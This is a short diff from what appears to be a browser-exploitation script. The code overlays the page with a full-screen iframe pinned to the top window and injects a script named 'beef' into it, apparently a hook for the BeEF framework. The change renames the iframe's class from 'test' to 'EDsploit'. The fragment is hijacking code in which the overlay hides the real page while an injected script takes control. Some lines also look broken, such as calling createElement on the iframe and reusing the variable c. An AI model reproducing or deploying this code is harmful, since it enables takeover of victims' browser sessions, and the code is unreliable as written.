@@ -38,7 +38,7 @@
         const i = window.top.document.createElement('iframe');
 		i.src = "/";
 		i.style ='position:fixed;inset:0;border:0;width:100vw;height:100vh;z-index:999999;background:#fff';
-		i.className = 'test';
+		i.className = 'EDsploit';
 		window.top.document.body.appendChild(i);
 		i.onload = () => {
 			const beef = i.createElement("script");
@@ -47,7 +47,7 @@
 			c.body.appendChild(beef)
 		};
 		const c = setInterval(() => {
-            if (window.top.document.body.getElementsByClassName('test').length > 0) {
+            if (window.top.document.body.getElementsByClassName('EDsploit').length > 0) {
                 clearInterval(c);
 				b()
 				setTimeout(() => {
